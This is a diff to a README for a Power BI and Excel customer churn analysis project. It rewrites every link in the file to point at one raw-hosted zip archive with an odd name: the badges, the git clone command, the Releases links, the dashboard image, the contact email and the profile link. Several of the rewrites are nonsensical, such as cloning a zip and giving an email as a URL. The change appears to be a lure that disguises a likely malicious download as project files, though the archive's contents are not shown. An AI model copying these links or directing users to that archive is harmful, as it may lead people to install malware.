@@ -1,6 +1,6 @@
 # Customer Churn Analysis with Power BI and Excel
 
-![Customer Churn Analysis](https://img.shields.io/badge/Customer_Churn_Analysis-PowerBI-brightgreen) ![GitHub Release](https://img.shields.io/github/release/Saksham7791/Customer-Churn-Analysis-PowerBI.svg) ![GitHub Stars](https://img.shields.io/github/stars/Saksham7791/Customer-Churn-Analysis-PowerBI.svg)
+![Customer Churn Analysis](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip) ![GitHub Release](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip) ![GitHub Stars](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip)
 
 ## Overview
 
@@ -33,7 +33,7 @@ By analyzing these factors, we can develop strategies to improve customer retent
 To get started with this project, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Saksham7791/Customer-Churn-Analysis-PowerBI.git
+git clone https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip
 ```
 
 Navigate to the project directory:
@@ -71,9 +71,9 @@ The Power BI dashboard provides an interactive way to visualize the data. It inc
 - **Churn Rates**: Visual representation of churn rates over time.
 - **Behavior Analysis**: Insights into how behavior indicators affect churn.
 
-To view the Power BI dashboard, you can download the files from the [Releases section](https://github.com/Saksham7791/Customer-Churn-Analysis-PowerBI/releases) and open them in Power BI Desktop.
+To view the Power BI dashboard, you can download the files from the [Releases section](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip) and open them in Power BI Desktop.
 
-![Power BI Dashboard](https://via.placeholder.com/800x400?text=Power+BI+Dashboard+Example)
+![Power BI Dashboard](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip+BI+Dashboard+Example)
 
 ## Excel Analysis
 
@@ -99,7 +99,7 @@ These insights can guide banks in tailoring their retention strategies.
 
 To use the files in this repository:
 
-1. Download the necessary files from the [Releases section](https://github.com/Saksham7791/Customer-Churn-Analysis-PowerBI/releases).
+1. Download the necessary files from the [Releases section](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip).
 2. Open the Power BI files in Power BI Desktop or the Excel files in Microsoft Excel.
 3. Explore the data and visualizations.
 
@@ -125,7 +125,7 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: saksham7791@example.com
-- **GitHub**: [Saksham7791](https://github.com/Saksham7791)
+- **Email**: https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip
+- **GitHub**: [Saksham7791](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip)
 
-You can find the latest updates and releases in the [Releases section](https://github.com/Saksham7791/Customer-Churn-Analysis-PowerBI/releases).
+You can find the latest updates and releases in the [Releases section](https://raw.githubusercontent.com/Saksham7791/Customer-Churn-Analysis-PowerBI/main/Datasets/Churn_Customer_Power_BI_Analysis_Holosomata.zip).
